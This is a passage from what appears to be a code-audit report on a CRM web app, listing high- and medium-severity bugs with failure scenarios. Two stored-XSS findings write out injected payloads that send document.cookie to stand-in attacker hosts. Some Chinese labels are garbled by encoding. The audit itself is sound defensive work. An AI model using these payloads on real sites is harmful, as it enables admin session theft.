  *Admin opens Prospects, opens a customer's recruit modal, fills nothing more and clicks 'Submit for Approval': the passive stub returns undefined, no recruitment_approval row is created, the modal stays open with no toast. The admin closes it believing the recruitment was submitted; the approval never reaches the queue. From the Customers view the flow dies one step earlier: the Recruit button itself no-ops.*
#### dim:data-perf
- **`chunks/script-agents.js:891`** — Agent edit modal pre-fills from cache-served light users row, then save wipes IC / commission / license / country  
  *Admin opens the app (users table cached with light rows), opens Agents → Edit on any agent, changes only the phone number and clicks Save. update('users', id, fields) writes ic_number:'', commission_rate:0, license_start:null, license_expiry:null, country:'MY' — silently erasing the agent's real IC number, commission rate, license dates, and resetting an SG/AU agent's home market to MY.*
- **`data.js:535`** — Calendar dashboard RPC primes canonical 'users' cache/snapshot with rows missing agent_code/team/employment_type and bumps the delta cursor  
  *User opens Calendar (default view) then Agents: the list (chunks/script-agents.js:162,336,338) renders Agent ID '—' and Team 'Sales' for every agent, and the weekly operating-hours KPI misreads employment_type (part-timers treated as full-time). Worse, editing an agent right after a calendar visit pre-fills agent_code/team blank and saving persists the blanks to the database.*
#### dim:error-handling
- **`chunks/script-calendar.js:6076`** — NPO close: npo_sales/items/installments creation failure is console-only, then the 'draft-only' guard permanently blocks any retry  
  *Agent closes an NPO deal for RM 24,000 (tier 24 x RM 1,000). During save, the npo_sales insert fails on a transient 5xx/network blip. The closing record still saves and auto-submits; the agent sees the green success toast and moves on. The npo_sales order, its items, and the 24-row installment schedule are never created — the deal never appears in the NPO Orders tab or the PORT KPI, installments are never tracked for collection, and because the closing record is now 'submitted' (locked), no code path will ever create them. Nobody finds out until a reconciliation audit.*
- **`data.js:1656`** — Sync-queue terminal outcomes are invisible: permanent failures park to a dead-letter key nothing reads, and 23505 unique-index hits silently DELETE the queued record  
  *Agent keys a CPS at an event venue with poor signal. saveActivity's duplicate check falls back to the stale local cache (chunks/script-activities.js:4576-4581), passes, and the new prospect is queued. Back online, the drain upserts it; the phone number matches an existing prospect owned by another agent (typed identically) → Postgres returns 23505 → classified 'duplicate' → the queued prospect is dropped from the queue permanently. The agent saw 'Activity saved!' hours earlier; the prospect and its CPS linkage never exist on the server and no one is ever notified.*
#### dim:leaks-timers
- **`chunks/script-activities.js:3519`** — Cancelled 'Add New Prospect as attendee' leaves a stale document listener that corrupts the next prospect creation  
  *Agent opens an event's attendee panel, taps the 'new prospect' option (showFTFAttendeeForm), then cancels the prospect modal. Hours later they create an unrelated prospect from the Prospects tab. The stale handler fires: it inserts an event_attendees row linking the brand-new, unrelated prospect to the old event (attendee_type 'prospect', status 'Registered'), force-navigates the screen to viewActivityDetails(oldActivityId), and toasts 'X added as attendee'. If the flow was opened and cancelled twice, two duplicate attendee rows are written.*
#### dim:load-perf
- **`vercel.json:51`** — Blanket 'immutable, max-age=1y' on ALL .js/.css silently defeats the SW network-first safety net and pins unversioned bundles for a year  
  *A src/react/* fix is deployed but the developer forgets to bump the ?v= token in index.html (the exact incident recorded 2026-06-16). Every returning client requests react-island.js?v=2026-06-28-1, the browser HTTP cache returns the year-fresh immutable copy without a network round-trip, the service worker's networkFirst handler never sees the network, and all users run the old React views until the ?v= is bumped — silently, with no error. Likewise, editing lunar-calendar.min.js (no version token) ships a file no existing client will ever re-download for 12 months.*
#### dim:money-dates
- **`chunks/script-customers.js:2072`** — Purchases are stamped with the UTC day, mis-dating sales entered before 08:00 MYT  
  *An agent books a sale at 01:30 MYT on 2026-07-01 (e.g. after a night event). The purchase row is written with date='2026-06-30'. The July monthly KPI (from='2026-07-01') skips it, June's already-reported totals silently change, and the month/quarter boss report attributes the revenue to the wrong period. The record stays wrong forever unless manually edited.*
- **`chunks/script-import.js:592`** — Import deal_value uses raw parseFloat, truncating thousand-separated amounts 1000x (bypasses _parseAmount)  
  *A team leader imports a prospect sheet exported from Excel where Deal Value is formatted with thousand separators ('15,000'). Every such prospect is silently stored with deal_value=15 — pipeline forecasts and potential-list money figures are 1000x too small — or null for 'RM 15,000', with no validation warning. The update-existing path writes the truncated value over a previously correct one.*
#### dim:react-island
- **`src/react/views/CustomersTable.jsx:97`** — Health column renders the literal text "[object Promise]" — renderQuickHealthBadge resolves to script.js's async lazy stub, not the real chunk function  
  *Fresh session: user logs in (calendar loads), navigates to Customers. Every row's Health cell shows the literal text "[object Promise]" instead of the Healthy / At Risk / Churning badge, on every page and every re-render, until the user happens to visit Booking Scheduler or another CPS-chunk surface in the same session.*
- **`src/react/views/CustomersTable.jsx:112`** — Customers-row Edit button feeds a CUSTOMER id into openProspectModal, which looks up the prospects table by PK  
  *Super Admin opens Customers, clicks the pencil icon on customer #57. openProspectModal fetches prospects row id=57 — a completely different person (with ~632 prospects vs ~110 customers, low-id collisions are near-certain). The 'Edit Prospect' modal opens pre-filled with the unrelated prospect's data over the customer list; the admin tweaks a phone number or agent and saves — silently overwriting the unrelated prospect's record. When no prospect id collides, the click just errors 'Prospect not found', a broken button either way.*
- **`ui.js:281`** — UI.hideModal unconditionally unmounts the VIEW-embedded Knowledge-HQ editor island, blanking the editor whenever any modal closes  
  *User opens a knowledge entry (detail editor mounts into #kb-slot), clicks its Delete button — script-knowledge.js:536 opens a 'Delete entry?' confirm whose Cancel action is 'UI.hideModal()'. User clicks Cancel to keep the entry; hideModal fires unmountKbEditor and the entire editor area goes blank, discarding edits typed since the last debounced autosave. Same blanking hits the capture editor (no autosave at all — the whole draft is lost) if the user opens/closes any modal (notification panel, daily-note popup, promote-selection dialog at script-knowledge.js:736) mid-draft.*
#### dim:xss
- **`chunks/script-agents.js:908`** — Stored XSS via unescaped users-table fields in Edit Agent modal attribute values  
  *A Marketing Manager (L2) imports an Agents CSV whose Full Name column contains `"><img src=x onerror="fetch('https://evil.example/x?c='+encodeURIComponent(document.cookie))">`. Validation passes (name is non-empty) and the value is stored raw in users.full_name. Later a Super Admin (L1) opens Agent Management and clicks Edit Profile on that agent; openAddAgentModal renders `<input type="text" id="agent-name" ... value=""><img src=x onerror=...>">`, the injected img element fires onerror in the Super Admin's browser, exfiltrating the admin session.*
#### documents+cps
- **`chunks/script-cps.js:137`** — Co-agent invite JSONB containment queries String(cu.id) but stored ids are numbers — invites never surface in the bell  
  *Agent A adds Agent B as co-agent on an activity via the search picker. Agent B's notification bell badge never increments and the  Co-agent invitation item never appears in the panel, so the invite sits 'pending' indefinitely. (Only entries written with string ids, e.g. the assign-on-behalf select-value path at script-activities.js:4652, can match.)*
- **`chunks/script-cps.js:235`** — Notif-panel Accept/Reject buttons call app.respondCoAgentInvite which has no lazy stub — TypeError when activities chunk not loaded  
  *User logs in, lands on dashboard, clicks the bell, sees a pending co-agent invitation and clicks ✓ Accept: the inline handler throws `app.respondCoAgentInvite is not a function`, the panel closes (the `?.remove()` runs first in the other button but here the throw happens before remove), and the invitation is never accepted — with no error feedback to the user.*
- **`chunks/script-documents.js:767`** — Per-file Delete button is a silent no-op — app.deleteFile lives only in the fude chunk  
  *Fresh session → navigate to Documents → click the trash icon on any file row: nothing happens — no confirm modal, no toast, file not deleted. Delete only works if the user happened to visit the ç¦è¿ç›¸éš view first in the same session. Only the batch Delete Selected path works reliably.*
#### gcal+journey
- **`chunks/script-journey.js:1219`** — Touchpoint spawn paths have no dedup — repeated triggers/clicks create duplicate task sets  
  *A team leader clicks "ç”Ÿæˆå¹´åº¦è·Ÿè¿›ä»»åŠ¡" twice (double-click or after a slow toast) → 2 full sets of all 7 annual-stage touchpoints are inserted. Likewise, a prospect who attends two æ±‡é›† events months apart fires 'pr_huiji_attended' skip_to_stage twice via script-activities → a second identical set of pr_post_huiji follow-up tasks lands in the agent's queue, inflating overdue/pending counts and the agent_journey_load view.*
#### knowledge+org+settings
- **`chunks/script-knowledge.js:537`** — Knowledge modals pass {text, cls} button objects but UI.showModal reads btn.label/btn.type — buttons render as 'undefined'  
  *User clicks 'Delete entry' on a knowledge entry: the confirmation modal shows two indistinguishable buttons both captioned 'undefined', neither styled as destructive. Clicking the second one permanently deletes the entry with no readable label — a user guessing which button is Cancel has a 50% chance of irreversibly deleting their note. Same for the Ctrl+Shift+N quick-capture modal (Cancel/Capture both read 'undefined').*
- **`chunks/script-knowledge.js:635`** — Daily-notes date switch does not cancel the pending autosave timer — can overwrite another day's note with empty content  
  *User types a note on 2026-07-02, then within 800 ms clicks the next-day arrow. The timer fires while 2026-07-03's content is still loading: saveDailyNote finds 2026-07-03's existing row and updates it with content='' — the existing note for 2026-07-03 is permanently wiped, and the text just typed for 2026-07-02 is never saved either (double data loss).*
#### npo+order-form-extract
- **`chunks/script-npo.js:729`** — Quote-breakout XSS in NPO customer search results (escapeHtml + replace is a no-op)  
  *Benign: a customer named "O'Brien" appears in the New NPO Order search; clicking the row throws SyntaxError (onclick = app.npoPickCustomer(12, 'O'Brien')) and the customer can never be selected. Malicious: an agent saves a customer named x');fetch('https://evil/?c='+document.cookie);//  — when a super admin later types a matching term in the NPO order customer search, the crafted onclick renders and one click executes arbitrary JS in the admin's session (stored XSS).*
- **`chunks/script-order-form-extract.js:514`** — History search input is destroyed and loses focus on every keystroke  
  *A user opens Order Form Extract → History and types "tan" in the search box: after the 't' the input is replaced and focus is lost, so 'a' and 'n' go nowhere. The user must re-click the search box after every single character, making the History search effectively unusable except by paste.*
- **`chunks/script-order-form-extract.js:967`** — Closing activity saved without lead_agent_id — invisible in scoped KPI/reporting, no agent attribution  
  *An agent scans a PREON order form and clicks 'Save Closing Activity'. The activity row lands with lead_agent_id NULL. The agent's own KPI tab and every team-scoped report skip the row entirely (visible-ids filter never contains null), and even org-wide views cannot attribute the sale to any consultant — the closing amount silently vanishes from all sales/KPI numbers.*
#### script
- **`script.js:2888`** — Notification bell badge + realtime subscription never initialize — _initNotifBell lives in the never-eagerly-loaded cps chunk  
  *Any user logs in; a customer submits a CPS intake request or a refill reminder comes due. The bell in the top bar never shows an unread badge for the whole session, so admins/agents don't know pending items exist unless they happen to click the bell (whose inline onclick app.toggleNotifPanel does lazy-load the chunk). Time-sensitive intake approvals sit unnoticed.*
- **`script.js:4341`** — uploadProspectDocument stub recurses infinitely (stack overflow) — Upload button in prospect detail is dead until the fude chunk loads  
  *Agent logs in on desktop (lands on Calendar), opens Prospects → any prospect detail → Notes/Documents tab, clicks the 'Upload' button without ever having visited the ç¦è¿ç›¸éš (fude) view. The stub calls itself until 'RangeError: Maximum call stack size exceeded'; the error is swallowed by window.onerror and the button silently does nothing — document upload appears completely broken.*
#### ui+app-init
- **`app-init.js:263`** — Quick Capture (palette entry + Ctrl+Shift+N) silently no-ops until the Knowledge chunk is loaded  
  *A logged-in agent who has not opened Knowledge HQ this session presses Ctrl+Shift+N (or picks 'Quick Capture (new entry)' from the Ctrl+K palette). The guard evaluates window.app.openCaptureModal as undefined and returns: no modal, no toast, no error. The user concludes the shortcut is broken. It only starts working after they manually visit the Knowledge HQ view once.*

---

## 4. Confirmed MEDIUM-severity findings (179)


**agents+features2**

- `chunks/script-agents.js:248` (functional) — Agents legacy-table fallback was removed — kill-switch and React-bundle failure dead-end on an error page
- `chunks/script-agents.js:1374` (data-integrity) — confirmDeleteAgent cascade skips the customers table and is non-atomic
- `chunks/script-agents.js:1470` (security) — resetAgentPassword never sets force_password_change despite promising a forced change
- `chunks/script-agents.js:1526` (functional) — sendRenewalReminder sends nothing but toasts 'Renewal reminder sent via Email/WhatsApp.'
- `chunks/script-features2.js:201` (bug) — addScoreToCustomer writes to customers.score, a column that does not exist in production
- `chunks/script-features2.js:561` (functional) — sendBirthdayWish 'Send' button discards the composed message and fakes success
- `chunks/script-features2.js:629` (functional) — Birthday gift/task action creates a note no surface ever displays (due_date read nowhere)
- `chunks/script-features2.js:1079` (performance) — Special Programs pulls the entire purchases, customers and activities tables to the client

**approvals+admin**

- `chunks/script-admin.js:61` (performance) — showAuditLogs fetches the entire audit_logs table client-side to display 50 rows
- `chunks/script-approvals.js:121` (security) — Stored XSS in manager's approval queue: unknown approval_type rendered unescaped via tc.label
- `chunks/script-approvals.js:299` (data-integrity) — Queue-approved sale purchase created without currency, unlike both sibling purchase paths
- `chunks/script-approvals.js:323` (data-integrity) — approveQueueEntry marks queue entry 'approved' even when the conversion it triggered failed
- `chunks/script-approvals.js:474` (security) — rejectClosingRecord and rejectProspectConversion lack the isManagement gate their approve/reject siblings have
- `chunks/script-approvals.js:638` (logic) — UTC date used for purchase date / customer_since fallbacks — off-by-one day for Malaysia (UTC+8)

**auth+data-helpers+push-notifications+sw+build**

- `auth.js:15` (security) — validatePasswordStrength is dead code — no password path enforces the documented policy
- `data-helpers.js:64` (logic) — isAbortError misclassifies Postgres statement-timeout errors as benign view-change aborts
- `sw.js:278` (functional) — notificationclick tab-reuse never matches: compares '/index.html' against clients at '/'

**boss-report+forms+whatsapp**

- `chunks/script-boss-report.js:238` (data-integrity) — Stale sales/tracking file buffers survive across view visits — report silently generated from last week's files
- `chunks/script-forms.js:119` (data-integrity) — One-click irreversible cascade deletes with no confirmation (deleteLeadForm, deleteSurvey, deleteCustomFieldDefinition)
- `chunks/script-forms.js:176` (data-integrity) — processFormSubmission creates a duplicate prospect — form.html already auto-creates one at submission time
- `chunks/script-whatsapp.js:344` (functional) — Template sends from the modal always pass empty variables — parameterized templates fail and stored content keeps raw {{placeholders}}

**activities**

- `chunks/script-activities.js:718` (bug) — updateActivity's refresh guard checks an identifier that never exists in this chunk, so calendar/today lists never refresh after an edit
- `chunks/script-activities.js:1819` (logic) — OCR normalizeDate falls back to new Date(str).toISOString(), shifting text-month dates one day earlier for UTC+8 users
- `chunks/script-activities.js:3568` (performance) — EVENT/CPS attendee search downloads the full prospects + customers tables per search and has no race token
- `chunks/script-activities.js:4114` (logic) — Co-agent search filter (lvl >= 3 || ...) admits customers, referrers, stock-take staff and role-less users as co-agent candidates
- `chunks/script-activities.js:4328` (logic) — Journey-rule evaluation reads fields (notes, proposed_solution, event_category) that the saved activity never contains — CPS-interest and event triggers are dead
- `chunks/script-activities.js:4664` (logic) — UTC-based date defaults (new Date().toISOString().split('T')[0]) are one day behind in Malaysia between 00:00 and 08:00 local
- `chunks/script-activities.js:4674` (data-integrity) — CPS save is non-atomic: prospect + referral are created before the activity, and the hard-duplicate check then blocks any retry
- `chunks/script-activities.js:4875` (functional) — CPS scan photo never attaches to the activity: the first stash consumer deletes _state.cppf.cps before the photo_urls upload block reads it

**ai**

- `chunks/script-ai.js:337` (logic) — Forecast baseline and '% vs last month' delta treat the current partial month as a complete month
- `chunks/script-ai.js:1930` (data-integrity) — _todayISO uses the UTC date — AI-created activities are dated yesterday between 00:00 and 08:00 Malaysia time
- `chunks/script-ai.js:1935` (data-integrity) — AGENT_MEETING / AGENT_TRAINING activities created without a visibility field — invisible to everyone but the creator (repeat of the fixed 236-row incident)

**calendar**

- `chunks/script-calendar.js:2816` (logic) — Calendar 'Agent' filter is silently ignored for system admins in every view
- `chunks/script-calendar.js:4100` (bug) — goToPrevious/goToNext use setMonth on month-end dates — navigation skips or repeats months on the 29th-31st
- `chunks/script-calendar.js:6030` (data-integrity) — NPO installment schedule _addMonths overflows month-end start dates — February installment lands in March

**customers**

- `chunks/script-customers.js:458` (logic) — 'Min events attended' filter counts event registrations of ALL attendee types and statuses
- `chunks/script-customers.js:1552` (data-integrity) — savePlatformIds never deletes rows the user removed from the modal
- `chunks/script-customers.js:1809` (data-integrity) — saveCustomer silently drops the 'Previous Prospect ID' and 'Notes' form fields
- `chunks/script-customers.js:2072` (logic) — Purchase date stamped from UTC — early-morning Malaysia sales get dated the previous day
- `chunks/script-customers.js:2081` (bug) — Add Purchase 'Redemption Image' file is silently discarded and replaced with the placeholder string 'image_uploaded.png'
- `chunks/script-customers.js:2250` (performance) — Delivery Listing re-fetches the ENTIRE purchases, prospects and users tables on every debounced search keystroke

**egg**

- `chunks/script-egg.js:322` (data-integrity) — Blank order_no collapses distinct orders into one unique_key — silent row drops and permanent cross-week suppression
- `chunks/script-egg.js:548` (security) — Wholesale group name rendered into innerHTML without escaping (XSS from uploaded file)
- `chunks/script-egg.js:1059` (functional) — Default JSX path: every successful CSV/XLSX upload also fires a false 'parse failed' error toast
- `chunks/script-egg.js:1819` (performance) — Commit performs one awaited insert per row (2 sequential loops) — slow and non-atomic
- `chunks/script-egg.js:2100` (functional) — Default JSX path: urgent-order save shows false 'Save failed' error and list never refreshes — invites duplicate records
- `chunks/script-egg.js:2171` (security) — Manual-reconcile picker interpolates raw unique_key into data-key attribute without escaping
- `chunks/script-egg.js:2211` (functional) — Default JSX path: cancel/expire/manual-reconcile/config-save all report false failures after succeeding

**formula**

- `chunks/script-formula.js:1003` (data-integrity) — PO item free_quantity persisted from the stale recommendation, not the user-edited quantity
- `chunks/script-formula.js:1920` (functional) — Stock import commit drops the lowercase header fallbacks that the preview accepts

**fude**

- `chunks/script-fude.js:293` (logic) — L13/L14 user pool filtered by /Level\s*1[34]/ regex — members with Chinese-only roles (æ”¹å‘½å®¢æˆ·, å‡†ä¼ ç¦å¤§ä½¿) are excluded
- `chunks/script-fude.js:657` (functional) — Highlight push-notification fan-out silently skipped when the activities chunk is not loaded
- `chunks/script-fude.js:2043` (data-integrity) — CPS save discards the visible Dealer/CPS date inputs and re-stamps signature timestamps to now() on every save

**import**

- `chunks/script-import.js:82` (functional) — Import dashboard Export buttons call app.exportData, which is defined in chunks/script-prospects.js — silent no-op until that chunk loads
- `chunks/script-import.js:668` (data-integrity) — Required-field validation only runs if the column is mapped — unmapped Name/Phone pass validation and import as empty records
- `chunks/script-import.js:818` (functional) — Changing Import Type on step 2 does not re-render the field-mapping dropdowns — mapping (and Auto-map) breaks for the newly selected type
- `chunks/script-import.js:1173` (performance) — Protection view and reassignment modals download the entire activities table and run O(prospects × activities) filter+sort loops
- `chunks/script-import.js:2366` (functional) — Configure Alerts settings are saved to localStorage but never read — warning/critical thresholds and auto-reassign flag have zero effect

**marketing**

- `chunks/script-marketing.js:182` (performance) — _buildSpecialProgramsPayload calls calculateProgramProgress without the prebuilt index — full-table bucket rebuild per participant
- `chunks/script-marketing.js:1260` (performance) — Event delete cascades with one awaited round-trip per linked activity/attendee (N+1, up to 10,000 sequential calls)
- `chunks/script-marketing.js:1294` (logic) — Package 'Visible To' (customer/agent) setting is written but never enforced anywhere
- `chunks/script-marketing.js:1641` (functional) — 'Export Data' header button silently no-ops until the script-fude chunk happens to load
- `chunks/script-marketing.js:3702` (data-integrity) — Editing a template (or relaunching a campaign) overwrites created_at/created_by with the editor and current time
- `chunks/script-marketing.js:4781` (performance) — Recipient search: per-keystroke full refetch with per-message getById N+1, and nameless prospects vanish

**mobile**

- `chunks/script-mobile.js:956` (logic) — birthday_auto logged touches leak into Home schedule, Week/Day/List views and the WhatsApp sheet
- `chunks/script-mobile.js:2403` (data-integrity) — Optimistic-row bookkeeping is in-memory only, so after a reload the persistent retry queue's give-up path silently drops the save
- `chunks/script-mobile.js:2462` (data-integrity) — Retry queue write in drain clobbers entries enqueued while the drain is in flight
- `chunks/script-mobile.js:2613` (data-integrity) — mcalBirthdayWa resolves an ambiguous id by probing prospects first, logging the wish activity to the wrong record
- `chunks/script-mobile.js:3458` (bug) — Client search has no request sequencing — a slower stale search response overwrites newer results

**pipeline**

- `chunks/script-pipeline.js:173` (data-integrity) — savePipelineConfigJson swallows the primary write failure — callers toast success, edits silently lost
- `chunks/script-pipeline.js:1040` (performance) — Team sections + focus rows: sequential per-user queries and per-row getById/getNoteCount N+1
- `chunks/script-pipeline.js:1320` (performance) — Default JSX path shows a blank view while the entire payload builds — the STEP-1 skeleton is bypassed
- `chunks/script-pipeline.js:1343` (bug) — React mount-failure 'fallback to legacy' leaves a permanently blank pipeline view
- `chunks/script-pipeline.js:1882` (logic) — Weekly check_date mixes local-time weekday with UTC date string — checks vanish/duplicate before 8am MYT
- `chunks/script-pipeline.js:2074` (data-integrity) — focus_month stamped from UTC — items added on the 1st before 8am MYT get last month's key and are auto-archived same day
- `chunks/script-pipeline.js:2716` (functional) — showComments reads non-existent activities column `a.notes` — every activity shows 'No notes provided.'
- `chunks/script-pipeline.js:3193` (performance) — openExpiredSearchModal runs up to 50 sequential calcPipelineEntry calls without the prefetched bundle (N+1 referral/solution queries)

**prospects**

- `chunks/script-prospects.js:195` (functional) — Prospects header 'Import' button silently no-ops until script-import.js is loaded by something else
- `chunks/script-prospects.js:1206` (logic) — Protection deadline parsed as UTC midnight — shows 'Expired' from 8:00 AM local on the deadline day (Malaysia UTC+8)
- `chunks/script-prospects.js:1364` (data-integrity) — bulkDeleteProspects deletes only the prospect rows, orphaning activities/notes/names/referrals
- `chunks/script-prospects.js:1949` (functional) — Score-adjust badge and Potential-tab edit buttons no-op on desktop (features2 chunk not loaded)
- `chunks/script-prospects.js:2165` (bug) — CPS header photo never renders — filter tests non-existent activity properties
- `chunks/script-prospects.js:6398` (functional) — Recruit modal 'Submit for Approval' no-ops unless the fude chunk is loaded

**referrals**

- `chunks/script-referrals.js:590` (logic) — Leaderboard fallback groups by referrer_id without referrer_type — cross-type rows merged, wrong names
- `chunks/script-referrals.js:599` (performance) — Leaderboard fallback does up to 3 sequential awaited getById calls per referrer for ALL referrers
- `chunks/script-referrals.js:893` (logic) — Tree node CPS/unable-to-serve colouring uses prospect_id only — always wrong for customer nodes
- `chunks/script-referrals.js:1218` (data-integrity) — getAncestorPath resolves 'user'-type referrers against the prospects table — wrong or 'Restricted' chain entries

**reporting**

- `chunks/script-reporting.js:569` (logic) — NPO weekly aggregate window shifted 8 hours: local date strings bound a UTC timestamp
- `chunks/script-reporting.js:922` (security) — 'Activity Attendance Breakdown' is unscoped and counts registrations rather than attendance
- `chunks/script-reporting.js:975` (security) — 'Cases by Product Category' ignores _visibleUserIds — org-wide sales case counts shown to scoped viewers
- `chunks/script-reporting.js:1214` (logic) — Weekly range off-by-one: current window is 8 inclusive days vs previous window's 7
- `chunks/script-reporting.js:1397` (logic) — Conversion-rate fallback compares ISO timestamp created_at against date-only bound — final day's prospects excluded
- `chunks/script-reporting.js:2083` (logic) — KPI drill-down fast paths ignore the active market scope, unlike the cards
- `chunks/script-reporting.js:2500` (logic) — New Customers drill-down omits the purchase-in-range requirement the KPI card applies
- `chunks/script-reporting.js:3594` (bug) — saveYearlyTargets has no error handling and saves NaN for cleared fields

**search**

- `chunks/script-search.js:238` (logic) — Group Logic selector is hardcoded to group 0 and inter-group combination is always AND — OR across groups is impossible
- `chunks/script-search.js:809` (functional) — Event Category filter dropdown is never populated — category filtering of events is impossible
- `chunks/script-search.js:1376` (performance) — Has Purchased / Has Not Purchased filter downloads the entire activities table
- `chunks/script-search.js:1876` (logic) — Advanced condition '='/'!=' never matches boolean columns (true == 'true' is false in JS)
- `chunks/script-search.js:1881` (logic) — Advanced condition '>'/'<' on date fields compares only the year (parseFloat on 'YYYY-MM-DD')

**stock-take**

- `chunks/script-stock-take.js:554` (data-integrity) — stCloseSession/stDeleteSession update localStorage only — the cloud st_sessions row stays status='open' forever
- `chunks/script-stock-take.js:719` (bug) — All displayed times are raw UTC ISO slices — 8 hours wrong for Malaysia; default session ID uses UTC date
- `chunks/script-stock-take.js:830` (data-integrity) — Cloud mirror inserts never check the Supabase response error — failed st_counts inserts are silently dropped
- `chunks/script-stock-take.js:845` (data-integrity) — stDeleteCount removes the row locally only — the mirrored st_counts row and every other device keep it
- `chunks/script-stock-take.js:2085` (data-integrity) — Recounts double-count on other devices: realtime subscribes INSERT only, so the supersede/delete never propagates (and staff RLS silently blocks the delete)
- `chunks/script-stock-take.js:2255` (data-integrity) — Expected-SKU 'Add / Update' upserts st_product_master with empty name/attribute, clobbering existing product names

**data**

- `data.js:2232` (data-integrity) — add() reports success to the caller even when the insert was permanently rejected by the server (RLS deny, NOT NULL, CHECK) — the record is later parked and silently vanishes
- `data.js:2246` (bug) — createMany stamps colliding ids (Date.now() + rand(0..999)) on same-millisecond rows, so large bulk inserts nearly always fail and fall back to N sequential round-trips
- `data.js:2510` (bug) — update()/delete()/deleteMany scan the sync queue with unguarded q.record.id, crashing on the legacy no-record entries the drain paths explicitly guard against
- `data.js:2542` (data-integrity) — delete() throws 'permission_denied' before cleaning the sync queue when the row isn't on the server — a deleted pending-sync record later resurrects
- `data.js:3749` (logic) — Journey dates serialized via toISOString().slice(0,10) shift one day earlier for any action before 08:00 Malaysia time

**dim:authz**

- `chunks/script-features2.js:1436` (security) — Special Program delete/save/create actions have no role gate (UI-hidden only)
- `chunks/script-whatsapp.js:435` (security) — WhatsApp forwardMessage dumps every prospect and customer name into the forward picker unscoped
- `script.js:3407` (security) — 'ranking' view registry entry has no role gate — reachable by any authenticated level

**dim:build-deploy**

- `build.mjs:158` (performance) — The entire brotli-11 pre-compression stage is dead in production — Vercel does not serve the sibling .br files, so the promised ~300 KB first-load saving never materializes
- `sw.js:202` (performance) — RUNTIME_CACHE grows without bound: old hashed bundle versions are never evicted, and the only purge (CACHE_VERSION bump) is deliberately avoided by deploy policy

**dim:cross-chunk**

- `app-init.js:368` (functional) — Quick Capture (Ctrl+Shift+N and command-palette action) silently no-ops until Knowledge HQ has been opened
- `chunks/script-customers.js:654` (functional) — Customer 'Edit' header button (and referral/settings prospect-modal entry points) no-op via the passive openProspectModal stub
- `chunks/script-customers.js:658` (functional) — Customer 'Portal Link' button throws — sendPortalLink lives in the forms chunk with no stub at all
- `chunks/script-customers.js:2118` (bug) — savePurchase's closing-section refresh calls window.app.renderCustomerClosingTab unguarded — TypeError when the prospects chunk is absent
- `chunks/script-documents.js:767` (functional) — Documents view Delete button is dead — deleteFile is registered by the fude chunk, not the documents chunk
- `chunks/script-marketing.js:382` (functional) — Marketing view buttons wired to features2/fude-owned functions silently fail (New Program, Export Data, transaction profile link)
- `chunks/script-prospects.js:195` (functional) — Prospects header 'Import' button no-ops until the Import/Export view has been visited (openImportWizard is import-chunk-owned)
- `chunks/script-prospects.js:1949` (functional) — Prospect-detail score adjust / meetup-notes / forecast buttons dead on desktop — handlers live in script-features2.js, which only loads on mobile or the Milestones view

**dim:data-perf**

- `chunks/script-pipeline.js:968` (performance) — Primary view paths still pull whole HIGH_VOLUME tables via getAll, violating the data layer's own windowed-reader contract
- `chunks/script-pipeline.js:1040` (performance) — Pipeline team section runs one sequential my_potential_list query per subordinate (N+1)
- `data.js:671` (data-integrity) — Realtime persistence flush advances the delta-sync cursor without proof of completeness — websocket gaps become permanently stale rows
- `data.js:828` (performance) — Every single-row write deletes the full-table snapshot AND delta cursor, forcing a complete cold re-download on the next read
- `data.js:1371` (data-integrity) — Delta sync (getAllSince) is unpaginated — >1000 changed rows are silently dropped and the cursor advances past them
- `data.js:2605` (logic) — query() silently truncates at PostgREST's 1000-row cap — callers recompute and persist wrong aggregates

**dim:error-handling**

- `chunks/script-activities.js:4922` (functional) — Mobile calendar optimistic save: failed writes are swapped to 'synced' state and the entire retry/⚠ UX is dead code
- `chunks/script-calendar.js:6314` (data-integrity) — savePostMeetupNotes: AppDataStore fallback defeats the flow's own error surfacing — 'Failed to save notes' branch is unreachable
- `chunks/script-customers.js:2101` (data-integrity) — savePurchase: LTV RPC can commit while the purchases insert silently fails — compensation catch is unreachable, LTV permanently inflated
- `chunks/script-npo.js:1048` (data-integrity) — NPO order wizard: partial write with no rollback — retry after mid-sequence failure creates a duplicate npo_sales order

**dim:leaks-timers**

- `chunks/script-calendar.js:5240` (bug) — openMeetingCapture has no reentrancy guard — double-tap orphans a 1s interval and a screen wake lock
- `chunks/script-mobile.js:393` (bug) — Closing the voice recorder mid-recording leaves the microphone live and leaks the 1s timer interval

**dim:live-site**

- `sw.js:35` (functional) — Offline fallback page is broken: SW precaches '/offline.html' but Vercel cleanUrls 308-redirects it, producing a redirected response that cannot satisfy navigation requests
- `vercel.json:51` (bug) — Blanket 1-year immutable Cache-Control on ALL .js/.css pins unversioned mutable URLs (lunar-calendar.min.js, /libs/fontawesome/css/all.min.css) forever

**dim:load-perf**

- `index.html:90` (performance) — Login-screen icons depend on a 2-hop font chain (74 KB blocking CSS → 158 KB fa-solid-900.woff2) with font-display:block and no preload
- `index.html:648` (performance) — Third-party PapaParse from cdnjs sits mid defer-chain, gating script.min.js/app-init execution, yet is only used by lazy chunks
- `sw.js:24` (performance) — RUNTIME_CACHE grows without bound: cache-first hashed assets are never evicted and CACHE_VERSION is deliberately not bumped per deploy

**dim:money-dates**

- `chunks/script-performance.js:96` (logic) — Performance leaderboard mixes a LOCAL month start with a UTC month end, inverting the window on the 1st of each month
- `chunks/script-pipeline.js:1882` (bug) — Weekly action-plan checks are keyed to the UTC Monday, splitting/losing check state before 08:00 MYT
- `chunks/script-reporting.js:1397` (logic) — Conversion-rate fallback compares full timestamptz to a date-only string, excluding every prospect created on the window's last day
- `chunks/script-reporting.js:1476` (logic) — KPI sales sum loops have no null-date guard, so undated purchases are counted in EVERY reporting window
- `data.js:3749` (bug) — Journey touchpoint due_date and snooze_until computed via toISOString(), shifting a day early before 08:00 MYT

**documents+cps**

- `chunks/script-documents.js:436` (bug) — toggleStar's optimistic flip targets [data-star-id] which the chunk's own renderers never output — starring gives no visual feedback
- `chunks/script-documents.js:619` (performance) — Every folder render pulls the entire documents table including base64 file blobs
- `chunks/script-documents.js:1172` (data-integrity) — window._pendingUploads is never cleared — reopening the upload modal re-uploads the previous batch
- `chunks/script-documents.js:1197` (data-integrity) — Uploading (or creating a folder) while in Recent/All/Starred writes the sentinel string as folder_id/parent_id

**gcal+journey**

- `chunks/script-gcal.js:159` (performance) — First CRM→Google sync loops serially over the entire visible activities table (N+1 network calls)
- `chunks/script-gcal.js:247` (data-integrity) — Google→CRM import records every event — including future ones — as a completed 'Call' activity
- `chunks/script-gcal.js:750` (functional) — Google sync direction and per-type sync settings are saved but never enforced
